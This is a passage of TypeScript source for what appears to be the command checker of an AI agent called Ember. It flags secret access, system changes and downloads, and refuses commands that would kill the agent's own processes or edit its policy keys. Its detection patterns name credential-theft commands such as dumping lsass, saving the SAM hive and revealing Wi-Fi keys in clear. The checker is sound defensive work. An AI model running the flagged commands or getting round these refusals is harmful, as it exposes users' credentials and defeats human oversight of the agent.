  generic(h);
  let newFile = false;
  const pairs: Arg[] = [];
  const kept: Arg[] = [];
  for (let k = 0; k < h.args.length; k++) {
    const a = h.args[k];
    if (a.v === "-n" || a.v === "--newfile") { newFile = true; continue; }
    if (a.v === "-o" || a.v === "--oldfile") { newFile = false; continue; }
    if (a.v !== null && /^(-c|--convmode|-D|--display-enc)$/.test(a.v)) { k++; continue; }
    if (a.v !== null && a.v.startsWith("-") && a.v !== "-") continue;
    (newFile ? pairs : kept).push(a);
  }
  h.e.readArgs(kept, h.sc, { unresolvedUnclear: true });
  for (let k = 0; k + 1 < pairs.length; k += 2) {
    h.e.readArgs([pairs[k]], h.sc, { unresolvedUnclear: true });
    overwrites(h, pairs[k + 1]);
    if (pairs[k + 1].v && h.e.isDownloaded(pairs[k], h.sc)) h.e.carryDownload(pairs[k + 1].v ?? "", h.sc);
  }
  if (pairs.length % 2 === 1) h.e.readArgs([pairs[pairs.length - 1]], h.sc, { unresolvedUnclear: true });
});
reg(NATIVE, ["uniq", "guniq"], h => {
  // --group and --all-repeated take a method only after = (commands-remote-i5a).
  // Main's table gave both the next word: judged that way too (commands-held-8).
  const p = heldOpts(h, { shortValue: "fsw", longValue: ["skip-fields", "skip-chars", "check-chars"], longOptional: ["group", "all-repeated"] }, { shortValue: "fsw", longValue: ["skip-fields", "skip-chars", "check-chars", "group", "all-repeated"] });
  const [input, output] = p.operands;
  if (input) h.e.readArgs([input], h.sc, { unresolvedUnclear: true });
  if (output) overwrites(h, output);
});
reg(NATIVE, ["xxd"], h => {
  const p = opts(h, { shortValue: "cglosn", longValue: ["cols", "groupsize", "len", "seek", "name"] });
  const [input, output] = p.operands;
  if (input) h.e.readArgs([input], h.sc, { unresolvedUnclear: true });
  if (output) overwrites(h, output);
});
reg(NATIVE, ["iconv"], h => {
  const p = opts(h, { shortValue: "fto", longValue: ["from-code", "to-code", "output"] });
  for (const o of values(p, "o", "output")) overwrites(h, o === null ? { v: null, raw: "?", glob: false } : lit(o));
  h.e.readArgs(p.operands, h.sc, { unresolvedUnclear: true });
});
reg(NATIVE, ["patch", "gpatch"], h => {
  // --merge takes a style only after = (commands-remote-i5a).
  // Main's table gave --merge the next word and knew no --reject-format: judged that way too (commands-held-8).
  const p = heldOpts(h, { shortValue: "pioDdBFrVYzg", longValue: ["strip", "input", "output", "directory", "ifdef", "prefix", "fuzz", "reject-file", "version-control", "basename-prefix", "suffix", "get", "quoting-style", "reject-format"], longOptional: ["merge"] }, { shortValue: "pioDdBFrVYzg", longValue: ["strip", "input", "output", "directory", "ifdef", "prefix", "fuzz", "reject-file", "version-control", "basename-prefix", "suffix", "get", "quoting-style", "merge"] });
  let sc = h.sc;
  // GNU patch takes `--di`, the shortest unambiguous --directory, as it; optIs matches three letters or more
  // (commands-b7-5).
  const dir = values(p, "d", "di", "directory")[0];
  if (dir !== undefined) sc = child(h.sc, { cwd: dir === null ? null : resolveTargetPath(dir, { os: h.sc.os, home: h.sc.home ?? "", cwd: h.sc.cwd ?? "" }) });
  const ph: H = { ...h, sc, shellSc: h.shellSc ?? h.sc };
  // The folder it changes files in, which the patch's own text names: judged as a folder written into, so Ember's own is
  // refused and one Ember can't see asks (commands-a7-3).
  optionFiles(h, h.args, p, { into: ["d", "di", "directory"] });
  if (h.args.some(a => a.v === null && /^(-[A-Za-z]*d|--di(r(e(c(t(o(ry?)?)?)?)?)?)?=)/.test(a.raw))) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`);
  for (const f of values(p, "i", "input")) if (f) h.e.usePath(lit(f), "read", sc);
  for (const f of values(p, "o", "output", "r", "reject-file")) overwrites(ph, f === null ? { v: null, raw: "?", glob: false } : lit(f));
  const [file, patchFile] = p.operands;
  // The file it changes: an edit inside the user's work, judged by §3.6's rules like `sed -i`.
  if (file) h.e.usePath(file, "write", sc);
  if (patchFile) h.e.usePath(patchFile, "read", sc);
  // A patch this task downloaded, or one fetched into it: what it changes is that download (commands-remote-c5-4).
  const patches = [...values(p, "i", "input").flatMap(f => (f ? [lit(f)] : [])), ...(patchFile ? [patchFile] : [])];
  if (appliesDownload(ph, patches)) {
    if (file?.v) h.e.carryDownload(file.v, sc);
    else h.e.markUnnamed(".", sc);
  }
});
/**
 * Whether a patch tool applies something this task downloaded: a patch file it downloaded, or input fetched or read
 * from a download earlier in the pipeline (`curl … | git apply`, `cat x.patch | patch -p1`, `patch < x.patch`).
 */
function appliesDownload(h: H, patches: readonly Arg[]): boolean {
  if (patches.some(f => h.e.isDownloaded(f, h.sc))) return true;
  if ((h.s.stdin === "pipe" || h.s.stdin === "heredoc") && patches.length === 0 && (h.s.fetchBefore || h.e.pipe.carried === true)) return true;
  // A redirection is the shell's, opened in its folder, not the one `-d` or `-C` moves into (commands-remote-x6-4).
  return h.s.redirs.some(r => r.kind === "read" && r.target !== null && h.e.isDownloaded(r.target, h.shellSc ?? h.sc));
}
reg(NATIVE, ["certutil"], h => {
  // NSS's certutil (Linux, macOS): a capital letter names its command; adding, changing or deleting a certificate or
  // key changes what this computer trusts (review #108), and -W changes the store's password.
  if (h.sc.os !== "win32" && h.sc.family === "posix" && !h.pn.interop) {
    const cmds = h.args.map(a => a.v ?? "?");
    if (cmds.includes("-W")) h.e.add("secret", "secret.program", SAYS.secrets);
    if (cmds.some(c => /^(-[ABDEFGMNST]|--(merge|upgrade-merge|rename))$/.test(c))) h.e.add("system", "system.security", TRUST_SAYS);
    return;
  }
  const flags = h.args.map(a => (a.v ?? "").toLowerCase());
  if (flags.some(f => /^[-/](exportpfx|backupkey|backup|getkey|importpfx|repairstore|delstore|addstore|viewdelstore|deletehelloContainer)$/i.test(f))) h.e.add("secret", "secret.program", SAYS.secrets);
  if (flags.some(f => /^[-/]urlcache$/.test(f))) { const out = h.args.filter(a => !(a.v ?? "").startsWith("-") && !(a.v ?? "").startsWith("/")).pop(); if (out?.v && !URL_LIKE.test(out.v)) { h.e.usePath(out, "write", h.sc); h.e.download(out.v, h.sc); } }
});
reg(NATIVE, ["procdump", "procdump64"], h => { if (h.args.some(a => /lsass/i.test(a.v ?? ""))) h.e.add("secret", "secret.program", SAYS.secrets); });
reg(NATIVE, ["netsh"], h => {
  const a = h.args.map(x => (x.v ?? "").toLowerCase());
  if (a[0] === "wlan" && a.some(x => x === "key=clear")) { h.e.add("secret", "secret.program", SAYS.secrets); return; }
  if (a.some(x => /^(set|add|delete|reset|dump|import|export|install|uninstall|connect|disconnect|start|stop)$/.test(x))) h.e.add("system", "system.network", "Changes the firewall or network settings.");
});

// ------------------------------------------------------------------------------------------------------------------
// Privilege and system changes (§3.5.5).

reg(NATIVE, ["systemctl"], h => {
  const g = globals(h, "systemctl");
  checkGlobals(h, "systemctl", g);
  const verb = h.args[g.verbAt]?.v ?? null;
  const units = h.args.slice(g.verbAt + 1).filter(a => !isOption(a));
  if (verb === null) return;
  if (/^(poweroff|reboot|halt|suspend|hibernate|hybrid-sleep|suspend-then-hibernate|kexec|emergency|rescue|default|exit|soft-reboot)$/.test(verb)) { h.e.add("system", "system.power", "Shuts down, restarts or logs out."); return; }
  if (/^(start|stop|restart|reload|try-restart|reload-or-restart|try-reload-or-restart|condrestart|force-reload)$/.test(verb)) {
    h.e.add("system", "service.unit", "Starts, stops or changes a system service.", { objects: units.map(u => ({ kind: "other" as const, text: u.v ?? u.raw, abs: null })), widening: [verb], program: `systemctl ${verb}` });
    if (units.some(u => /^auditd(\.service)?$/.test(u.v ?? "")) && verb === "stop") h.e.add("system", "system.security", "Turns off or weakens a security protection.");
    return;
  }
  if (/^(enable|disable|mask|unmask|kill|isolate|daemon-reload|daemon-reexec|set-default|edit|link|preset|preset-all|revert|set-property|reset-failed|import-environment|set-environment|unset-environment|add-wants|add-requires|reenable|freeze|thaw|clean|bind|mount-image|switch-root)$/.test(verb)) {
    h.e.add("system", verb === "enable" || verb === "disable" || verb === "mask" || verb === "unmask" ? "service.unit" : "service.change", "Starts, stops or changes a system service.", { objects: units.map(u => ({ kind: "other" as const, text: u.v ?? u.raw, abs: null })), widening: [verb], program: `systemctl ${verb}` });
    if (verb === "edit") h.e.unclear("unclear.interactive", SAYS.interactive);
  }
});
reg(NATIVE, ["service", "rc-service", "invoke-rc.d", "update-rc.d", "chkconfig", "rc-update", "sv"], h => {
  const ops = h.args.filter(a => !isOption(a));
  const action = (ops[1]?.v ?? ops[0]?.v ?? "").toLowerCase();
  if (h.key === "service" && /^(status|--status-all)$/.test(action) || h.args.some(a => a.v === "--status-all")) return;
  if ((h.key === "chkconfig" || h.key === "rc-update") && /^(--list|show|-l)$/.test(action)) return;
  h.e.add("system", "service.unit", "Starts, stops or changes a system service.", { objects: ops.slice(0, 1).map(u => ({ kind: "other" as const, text: u.v ?? u.raw, abs: null })), widening: [action], program: `${h.key} ${action}` });
});
reg(NATIVE, ["launchctl"], h => {
  const verb = h.args[0]?.v ?? "";
  if (/^(submit)$/.test(verb)) { h.e.add("system", "system.schedule", "Schedules something to run later or at login."); return; }
  if (/^(load|unload|bootstrap|bootout|enable|disable|kickstart|kill|remove|start|stop|setenv|unsetenv|config|reboot|asuser|bsexec)$/.test(verb)) h.e.add("system", "service.change", "Starts, stops or changes a system service.");
});
reg(NATIVE, ["sc"], h => {
  if (h.sc.os !== "win32" && h.sc.family === "posix" && !h.sc.wsl) { generic(h); return; }
  const verb = (h.args.find(a => !(a.v ?? "").startsWith("\\\\"))?.v ?? "").toLowerCase();
  if (/^(config|create|delete|start|stop|pause|continue|failure|failureflag|sdset|privs|sidtype|description|control|managedaccount|triggerinfo|preferrednode)$/.test(verb)) h.e.add("system", "service.change", "Starts, stops or changes a system service.");
});
reg(NATIVE, ["net", "net1"], h => {
  const verb = (h.args[0]?.v ?? "").toLowerCase();
  const rest = h.args.slice(1);
  if ((verb === "start" || verb === "stop" || verb === "pause" || verb === "continue") && rest.length) { h.e.add("system", "service.change", "Starts, stops or changes a system service."); return; }
  if (/^(user|localgroup|group|accounts)$/.test(verb) && rest.length) { h.e.add("system", "system.users", "Changes users or groups."); if (rest.some(a => a.v === "*")) h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (verb === "share" && rest.length) { h.e.add("publish", "net.share", "Shares a folder on the network."); return; }
  if (verb === "time" && rest.some(a => /^\/set$/i.test(a.v ?? ""))) { h.e.add("system", "system.kernel", "Changes how the system works."); return; }
  if ((verb === "session" || verb === "file") && rest.some(a => /^\/(delete|close)$/i.test(a.v ?? ""))) { h.e.add("system", "kill.process", "Stops programs that are running (network sessions)."); return; }
  // `net use [Z:] \\host\share` and `net view \\host` connect to that computer and sign in there (review #171).
  if (verb === "use" || verb === "view") for (const a of rest) if (/^[\\/]{2}/.test(a.v ?? "")) h.e.usePath(a, "list", h.sc);
  if (verb === "use" && rest.some(a => /\\\\/.test(a.v ?? "")) && rest.some(a => /^\/user:/i.test(a.v ?? ""))) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
});
reg(NATIVE, ["reg", "regedit", "regini"], h => {
  const verb = (h.args[0]?.v ?? "").toLowerCase().replace(/^\//, "");
  const key = h.args[1]?.v ?? "";
  // `reg query|export|save|compare` only read the key (export and save write their file elsewhere, judged below).
  const reads = h.key === "reg" && /^(query|export|save|compare)$/.test(verb);
  if (h.args.some(a => a.v !== null && POLICY_KEY.test(a.v))) { h.e.refuseWith("ember.policy", reads ? "read" : "safety"); return; }
  if (/^(delete|import|restore|load|unload|copy)$/.test(verb) && policyAncestor(key)) { h.e.refuseWith("ember.policy", "safety"); return; }
  if (h.key === "regedit") { if (h.args.some(a => /^[/-]s$/i.test(a.v ?? ""))) h.e.add("system", "system.registry", "Changes the Windows registry."); else h.e.unclear("unclear.gui", SAYS.openApp); return; }
  if (h.key === "regini") { h.e.add("system", "system.registry", "Changes the Windows registry."); return; }
  if (/^(add|delete|import|load|unload|restore|copy)$/.test(verb)) { h.e.add("system", "system.registry", "Changes the Windows registry."); return; }
  if (verb === "save" && /^(hklm|hkey_local_machine)\\(sam|security|system)$/i.test(key)) { h.e.add("secret", "secret.program", SAYS.secrets); return; }
  if (verb === "save" || verb === "export") { const out = h.args[2]; if (out) h.e.usePath(out, "write", h.sc); }
});
reg(NATIVE, ["setx"], h => { h.e.add("system", "path.startup", "Changes what runs when you open a shell or log in."); });
reg(NATIVE, ["iptables", "ip6tables", "iptables-restore", "ip6tables-restore", "nft", "ufw", "firewall-cmd", "pfctl", "ebtables", "arptables"], h => {
  const a = h.args.map(x => x.v ?? "");
  const readOnly = a.length > 0 && (
    (/^ip6?tables$/.test(h.key) && a.every(x => /^(-[LSnvx]+|--list|--list-rules|--numeric|--verbose|--line-numbers|-t|filter|nat|mangle|raw|security|INPUT|OUTPUT|FORWARD|PREROUTING|POSTROUTING)$/.test(x)))
    || (h.key === "nft" && /^(list|-a|--handle|-j|--json)$/.test(a[0]) && a.slice(1).every(x => !/^(add|delete|flush|insert|replace|create|destroy|reset)$/.test(x)))
    || (h.key === "ufw" && /^(status|show|app)$/.test(a[0]) && !a.includes("update"))
    || (h.key === "firewall-cmd" && a.every(x => /^--(list|get|query|state|info)/.test(x) || /^--(zone|permanent)/.test(x)))
    || (h.key === "pfctl" && a.every(x => /^-s/.test(x) || /^[a-zA-Z]+$/.test(x) && false)));
  if (!readOnly) h.e.add("system", "system.network", "Changes the firewall or network settings.");
});
reg(NATIVE, ["ip"], h => {
  const a = h.args.filter(x => !isOption(x)).map(x => x.v ?? "");
  if (a.some(x => /^(add|del|delete|set|change|replace|flush|append|prepend|exec|attach|detach|up|down)$/.test(x))) {
    if (a.includes("exec") || a.includes("netns") && a.includes("exec")) h.e.unclear("unclear.ip-netns", "It runs a command Ember can't follow.");
    h.e.add("system", "system.network", "Changes the firewall or network settings.");
  }
});
reg(NATIVE, ["nmcli", "route", "networksetup", "ifconfig", "ifup", "ifdown", "resolvectl", "scutil", "hostnamectl", "timedatectl", "localectl", "arp", "ipconfig", "wpa_cli", "iwconfig", "iw", "ethtool", "tc", "brctl", "wg", "wg-quick", "openvpn", "nmtui"], h => {
  const a = h.args.map(x => (x.v ?? "").toLowerCase());
  const ops = h.args.filter(x => !isOption(x)).map(x => (x.v ?? "").toLowerCase());
  if (h.key === "nmcli" && (a.some(x => x === "-s" || x === "--show-secrets" || x === "show-password") || /\bwifi show\b/.test(a.join(" ")))) h.e.add("secret", "secret.program", SAYS.secrets);
  const write =
    h.key === "nmcli" ? ops.some(x => /^(modify|mod|up|down|delete|del|add|connect|disconnect|reload|on|off|edit|import|export|clone|hostname|rescan)$/.test(x))
    : h.key === "route" ? ops.some(x => /^(add|del|delete|change|flush)$/.test(x))
    : h.key === "networksetup" ? a.some(x => /^-(set|add|remove|create|delete|switch|order|detect)/.test(x))
    : h.key === "ifconfig" ? ops.length > 1
    : h.key === "ipconfig" ? a.some(x => /^[/-](release|renew|registerdns|setclassid)/.test(x))
    : h.key === "arp" ? a.some(x => /^-[ds]$/.test(x))
    : /^(hostnamectl|timedatectl|localectl|resolvectl|scutil)$/.test(h.key) ? ops.some(x => /^(set-|dns|domain|default-route|llmnr|mdns|dnssec|dnsovertls|revert|flush-caches)/.test(x)) || a.some(x => x === "--set")
    : h.key === "wg" ? ops.some(x => /^(set|setconf|addconf|syncconf)$/.test(x))
    : !/^(iw|ethtool|tc)$/.test(h.key) || ops.some(x => /^(set|add|del|change|replace|connect|disconnect|-s|-[A-Z])$/.test(x));
  if (h.key === "nmtui") { h.e.unclear("unclear.interactive", SAYS.interactive); h.e.add("system", "system.network", "Changes the firewall or network settings."); return; }
  if (write) h.e.add("system", "system.network", "Changes the firewall or network settings.");
});
reg(NATIVE, ["useradd", "userdel", "usermod", "groupadd", "groupdel", "groupmod", "gpasswd", "passwd", "chpasswd", "adduser", "deluser", "addgroup", "delgroup", "chsh", "chfn", "chage", "dscl", "sysadminctl", "dseditgroup", "newusers", "vipw", "vigr", "pwconv", "grpconv"], h => {
  if (h.key === "dscl" && !h.args.some(a => /^-(create|delete|append|merge|passwd|change|changei|createpl|deletepl|mcxset|mcxdelete)$/.test(a.v ?? ""))) return;
  if (h.key === "passwd" && h.args.some(a => /^-(S|-status)$/.test(a.v ?? ""))) return;
  h.e.add("system", "system.users", "Changes users or groups.");
  if ((h.key === "passwd" || h.key === "vipw" || h.key === "vigr" || h.key === "chsh" || h.key === "chfn") && h.s.stdin === null) h.e.unclear("unclear.interactive", SAYS.interactive);
});
reg(NATIVE, ["icacls", "cacls", "xcacls", "takeown"], h => {
  const flags = h.args.map(a => (a.v ?? "").toLowerCase());
  const target = h.args.filter(a => !(a.v ?? "").startsWith("/") && !/^[a-z0-9\\]+:\(/i.test(a.v ?? ""))[0];
  const rec = flags.includes("/t") || flags.includes("/r") || flags.includes("/s");
  const changes = h.key === "takeown" || h.key === "cacls" || h.key === "xcacls" || flags.some(f => /^\/(grant|deny|remove|setowner|reset|inheritance|setintegritylevel|restore|substitute)/.test(f));
  const obj = target ? h.e.usePath(target, rec ? "permTree" : "write", h.sc) : null;
  const outside = !obj || obj.abs === null || !h.sc.home || !isUnder(obj.abs, h.sc.home, h.sc.path);
  if (changes && (rec || outside)) h.e.add("system", "system.permissions", "Changes who may read or change files.", { widening: rec ? ["recursive"] : [] });
  if (flags.some(f => f === "/save")) { const out = h.args[h.args.findIndex(a => (a.v ?? "").toLowerCase() === "/save") + 1]; if (out) h.e.usePath(out, "write", h.sc); }
});
reg(NATIVE, ["schtasks"], h => { if (!h.args.some(a => /^[/-]query$/i.test(a.v ?? "")) || h.args.some(a => /^[/-](create|delete|change|run|end)$/i.test(a.v ?? ""))) h.e.add("system", "system.schedule", "Schedules something to run later or at login."); });
reg(NATIVE, ["shutdown", "reboot", "poweroff", "halt", "logoff", "logout-session", "gnome-session-quit", "xfce4-session-logout", "lxsession-logout", "pmset", "init", "telinit", "loginctl", "tsdiscon", "rwinsta", "reset-session"], h => {
  if (h.key === "loginctl" && !/^(terminate-|kill-|lock-|unlock-|poweroff|reboot|suspend|hibernate|enable-linger|disable-linger)/.test(h.args[0]?.v ?? "")) return;
  if (h.key === "pmset" && h.args.every(a => /^(-g|g|ps|batt|assertions|custom|sched|log|live|cap|therm|stats)$/.test(a.v ?? ""))) return;
  if (h.key === "pmset" && !h.args.some(a => /^(sleepnow|displaysleepnow|restoredefaults|schedule|repeat|relative)$/.test(a.v ?? ""))) { h.e.add("system", "system.kernel", "Changes how the system works."); return; }
  if ((h.key === "init" || h.key === "telinit") && !/^[0-6sSqQ]$/.test(h.args[0]?.v ?? "")) return;
  if (h.key === "shutdown" && h.args.some(a => /^(-c|\/a|-a)$/i.test(a.v ?? ""))) return;
  h.e.add("system", "system.power", "Shuts down, restarts or logs out.");
});
reg(NATIVE, ["rundll32"], h => {
  const target = (h.args[0]?.v ?? "").toLowerCase().replace(/\s+/g, "");
  if (/^url\.dll,(fileprotocolhandler|openurl)/.test(target) || /^shell32\.dll,(shellexec_rundll|openas_rundll)/.test(target)) {
    for (const a of h.args.slice(1)) if (/^ember:/i.test(a.v ?? "")) h.e.refuseWith("ember.url", "input");
    h.e.add("escape", "escape.launcher", SAYS.opensProgram);
    return;
  }
  if (/^user32\.dll,lockworkstation/.test(target)) { h.e.add("system", "system.power", "Shuts down, restarts or logs out."); return; }
  h.e.unclear("unclear.rundll32", "Runs code Ember can't see.");
});

/** Stopping programs (§3.5.5): class e unless they are the run's own jobs; Ember's own are refused (D4.5). */
function emberNameList(h: H): string[] {
  const names = ["ember", "Ember", "ember-remote", "ember.exe", "Ember.exe", "electron", "Electron", "electron.exe"];
  const m = /^\^\(\?:(.*)\)\$$/.exec(h.e.ctx.ember.names.source);
  if (m) for (const n of m[1].split("|")) names.push(n.replace(/\\([.+])/g, "$1"));
  return names;
}
function emberNamed(h: H, name: string): boolean {
  const re = new RegExp(h.e.ctx.ember.names.source, h.e.ctx.ember.names.flags.replace(/[gy]/g, ""));
  return re.test(name) || /^(ember|ember-remote|ember\.exe|electron|electron\.exe)$/i.test(name);
}
function killPids(h: H, pids: (string | null)[], widening: string[] = []): void {
  const objs: Obj[] = [];
  let own = true;
  for (const p of pids) {
    if (p === null) { own = false; objs.push({ kind: "process", text: "?", abs: null }); continue; }
    if (/^%\d*$|^%[%+-]$/.test(p)) continue;
    const n = Number(p);
    if (!Number.isFinite(n)) { own = false; objs.push({ kind: "process", text: p, abs: null }); continue; }
    if (n === -1) { h.e.refuseWith("ember.process", "safety"); return; }
    if (h.e.ctx.ember.pids.includes(Math.abs(n))) { h.e.refuseWith("ember.process", "safety"); return; }
    own = false;
    objs.push({ kind: "process", text: p, abs: null });
  }
  if (!own || objs.length) h.e.add("system", "kill.process", `Stops programs that are running (${joinList(objs.map(o => o.text)) || "?"}).`, { objects: objs, program: h.prog, widening });
}
reg(NATIVE, ["kill"], h => {
  if (h.args.some(a => a.v === "-l" || a.v === "-L" || a.v === "--list")) return;
  const pids: (string | null)[] = [];
  for (let k = 0; k < h.args.length; k++) {
    const a = h.args[k];
    if (a.v === null) {
      if (a.raw === "$!" || a.raw === "\"$!\"") continue;
      // `kill $(pgrep ember)`, `kill $(pidof electron)`: the substitution names Ember's own processes.
      if (a.raw.split(/[^A-Za-z0-9._-]+/).some(w => w !== "" && emberNamed(h, w))) { h.e.refuseWith("ember.process", "safety"); return; }
      pids.push(null);
      continue;
    }
    if (a.v === "-s" || a.v === "-n") { k++; continue; }
    if (/^-[A-Za-z0-9]+$/.test(a.v) && !/^-\d+$/.test(a.v) || /^-\d+$/.test(a.v) && k === 0 && h.args.length > 1 && !/^-1$/.test(a.v)) continue;
    if (a.v === "--") continue;
    pids.push(a.v);
  }
  killPids(h, pids);
});
reg(NATIVE, ["pkill", "killall", "pgrep-kill", "xkill", "fuser", "tskill", "skill", "snice", "killall5", "slay"], h => {
  if (h.key === "fuser" && !h.args.some(a => /^-[a-zA-Z]*k/.test(a.v ?? ""))) { h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc); return; }
  if (h.key === "killall5") { h.e.refuseWith("ember.process", "safety"); return; }
  // -e takes no value; pkill's -n and -o are switches where killall's are values, and killall's -g a switch (commands-remote-i5a).
  const short = h.key === "killall" ? "suoynZ" : h.key === "skill" || h.key === "snice" ? "tupc" : "sgGPtuUFO";
  const spec: OptSpec = { shortValue: short, longValue: ["signal", "pgroup", "group", "parent", "terminal", "euid", "uid", "session", "ns", "nslist", "pidfile", "older-than", "younger-than", "context", "older", "runstates"] };
  // Main's table was one for all of them, with -n, -o, -e, -y and -g taking the next word and no --older or --runstates,
  // so other words were the names it kills: judged that way too (commands-held-8).
  const was: OptSpec = { shortValue: "sgGPtuUnoFeOy", longValue: ["signal", "pgroup", "group", "parent", "terminal", "euid", "uid", "session", "ns", "nslist", "pidfile", "older-than", "younger-than", "context"] };
  const p = heldOpts(h, spec, was);
  const names = p.operands.map(a => a.v);
  const full = has(p, "f", "full");
  const regex = h.key === "pkill" || has(p, "r", "regexp");
  if (names.length === 0 && h.key !== "xkill" && h.key !== "fuser") { h.e.refuseWith("ember.process", "safety"); return; }
  for (const n of names) {
    if (n === null) continue;
    if (regex) {
      let re: RegExp | null = null;
      try { re = new RegExp(n, has(p, "i", "ignore-case") ? "i" : ""); } catch { re = null; }
      if (re === null) { h.e.unclear("unclear.kill-pattern", "Ember can't tell which programs this stops."); continue; }
      const candidates = [...emberNameList(h), ...(full ? ["/opt/ember/ember --type=renderer", "/usr/lib/ember/ember", "ember-remote serve", "C:\\Program Files\\Ember\\Ember.exe"] : [])];
      if (candidates.some(c => re!.test(c))) { h.e.refuseWith("ember.process", "safety"); return; }
    } else if (emberNamed(h, n) || /[*?[]/.test(n) && globRegExp(n, { ...h.sc.path, flavour: "posix" }, false).test("ember")) { h.e.refuseWith("ember.process", "safety"); return; }
  }
  // Matching whole command lines, other users', groups, sessions or terminals reaches more than the names say.
  const widening = p.opts.map(o => o.name).filter(n => /^(-[fuUgGPtsr]|--(full|euid|uid|pgroup|group|parent|terminal|session|ns|nslist|regexp|user|older-than|younger-than))$/.test(n));
  killPids(h, names.length ? names : ["?"], widening);
});
reg(NATIVE, ["taskkill"], h => {
  const pids: (string | null)[] = [];
  for (let k = 0; k < h.args.length; k++) {
    const f = (h.args[k].v ?? "").toLowerCase();
    if (f === "/pid") pids.push(h.args[k + 1]?.v ?? null);
    if (f === "/im") {
      const n = h.args[k + 1]?.v ?? null;
      if (n === null) { pids.push(null); continue; }
      if (emberNamed(h, n) || (/[*?]/.test(n) && globRegExp(n, { ...h.sc.path, flavour: "win32" }, false).test("ember.exe"))) { h.e.refuseWith("ember.process", "safety"); return; }
      pids.push(n);
    }
    if (f === "/fi") { h.e.unclear("unclear.kill-pattern", "Ember can't tell which programs this stops."); pids.push(null); }
  }
  killPids(h, pids);
});
/**
 * A gdb or lldb option that runs debugger commands, given on the line or read from a file (reviews #165, #166). Both
 * take one or two dashes; gdb also takes any unambiguous prefix of a long name (`-eval` is --eval-command) and a value
 * after `=`. gdb's -s is --symbols, not a script.
 */
function debuggerCode(key: string, word: string): boolean {
  const m = /^--?([A-Za-z][\w-]*)(=|$)/.exec(word);
  if (!m) return false;
  const name = m[1];
  if (key === "lldb") return /^([oOkKsS]|one-line|one-line-before-file|one-line-on-crash|source|source-before-file|source-on-crash)$/.test(name);
  return /^(ex|iex|x|ix)$/.test(name) || (name.length >= 2 && ["eval-command", "init-eval-command", "command", "init-command"].some(l => l.startsWith(name)));
}
reg(NATIVE, ["gdb", "lldb", "renice", "gcore", "dtrace", "dtruss", "perf"], h => {
  const pids = h.args.flatMap((a, k) => (/^(-p|--pid|-pid|--attach-pid)$/.test(h.args[k - 1]?.v ?? "") || /^--pid=/.test(a.v ?? "") ? [(a.v ?? "").replace(/^--pid=/, "")] : []));
  if (h.key === "renice") pids.push(...h.args.filter(a => /^\d+$/.test(a.v ?? "")).slice(1).map(a => a.v!));
  if (pids.some(p => h.e.ctx.ember.pids.includes(Number(p)))) { h.e.refuseWith("ember.process", "safety"); return; }
  if (pids.length) h.e.add("system", "system.debug", "Watches or changes another program that is running.");
  if (h.key === "perf" && /^(record|stat|trace|top)$/.test(h.args[0]?.v ?? "") && !pids.length) {
    // -a (every CPU) takes no value (commands-remote-i5a).
    // Main's table gave -a the next word and knew no -m or -u, so the command was another word: judged that way too
    // (commands-held-8).
    const p = heldOpts(h, { shortValue: "eopFcCtGmu", stopAtOperand: true }, { shortValue: "eopFcCtGa", stopAtOperand: true }, h.args.slice(1));
    h.e.payload(p.operands, h.sc, `perf ${h.args[0].v}`);
    return;
  }
  // gdb/lldb command and script options run debugger commands (which can `shell`/`platform shell`), from the line or a
  // file or stdin: Ember can't vouch for them, so batch mode runs only when none is present (reviews #165, #166).
  if (h.key === "gdb" || h.key === "lldb") {
    const code = h.args.some(a => a.v !== null && debuggerCode(h.key, a.v));
    if (code) h.e.unclear("unclear.inline-code", "It runs debugger commands Ember can't see.");
    else if (!h.args.some(a => /^-?-batch$/.test(a.v ?? ""))) h.e.unclear("unclear.interactive", SAYS.interactive);
  }
});
reg(NATIVE, ["mount", "umount", "losetup", "modprobe", "insmod", "rmmod", "swapon", "swapoff", "mountvol", "bcdedit", "bcdboot", "csrutil", "kextload", "kextunload", "kmutil", "nvram", "hdiutil", "fsutil", "sfc", "chkdsk", "defrag", "powercfg", "w32tm", "label", "subst", "dmsetup", "zfs", "btrfs", "lvcreate", "lvextend", "vgcreate", "pvcreate", "tune2fs", "e2fsck", "fsck", "xfs_repair", "update-grub", "grub-install", "grub2-mkconfig", "dracut", "mkinitcpio", "update-initramfs", "depmod", "sysctl", "setcap", "systemd-tmpfiles", "ldconfig", "update-alternatives", "alternatives"], h => {
  const a = h.args.map(x => x.v ?? "");
  if (h.key === "sysctl" && !a.some(x => /^-w$|=/.test(x) || x === "-p" || x === "--system" || x === "--load")) return;
  if (h.key === "hdiutil" && !/^(attach|mount|detach|eject|create|convert|resize|makehybrid|burn|erase)$/.test(a[0] ?? "")) return;
  if ((h.key === "fsutil" || h.key === "chkdsk" || h.key === "powercfg" || h.key === "w32tm" || h.key === "bcdedit") && a.length && a.every(x => /^[/-](query|list|l|enum|v|scan|stripchart|tz|monitor|getactivescheme|batteryreport|energy|requests|a|\?|help)/i.test(x) || /^(query|info|fsinfo|volume)$/i.test(x))) return;
  if (h.key === "csrutil" && /^(disable|enable|clear)/.test(a[0] ?? "")) { h.e.add("system", "system.security", "Turns off or weakens a security protection."); return; }
  if (h.key === "subst" && a.length === 0) return;
  if (h.key === "subst") h.e.unclear("unclear.windows-path", "Ember can't tell which file this names.");
  if (h.key === "mount" && a.length === 0) { h.e.add("system", "system.kernel", "Changes how the system works."); return; }
  h.e.add("system", "system.kernel", "Changes how the system works.");
});
// Desktop settings (review #108, #168). Every GNOME settings write (gsettings, dconf) changes the desktop's settings, as
// a registry write does on Windows (D4.3 e). Some weaken a protection the GUI policy asks about too (the proxy, the
// screen lock, remote access, privacy), and some set something that runs later (a keyboard shortcut's command, a shell
// extension, a default program): those say so. macOS's defaults asks for the domains that weaken a protection.
/** GNOME settings areas, as dotted key prefixes (`org.gnome.desktop.screensaver` holds `….lock-enabled`), and what changing one does. */
const SETTINGS_AREAS: readonly { rule: string; says: string; prefixes: readonly string[] }[] = [
  { rule: "system.network", says: "Changes the firewall or network settings.", prefixes: ["org.gnome.system.proxy"] },
  {
    rule: "system.security", says: "Turns off or weakens a security protection.",
    prefixes: [
      "org.gnome.desktop.screensaver", "org.gnome.desktop.lockdown", "org.gnome.desktop.remote-desktop", "org.gnome.desktop.privacy",
      "org.gnome.desktop.media-handling", "org.gnome.desktop.session.idle-delay", "org.gnome.settings-daemon.plugins.sharing",
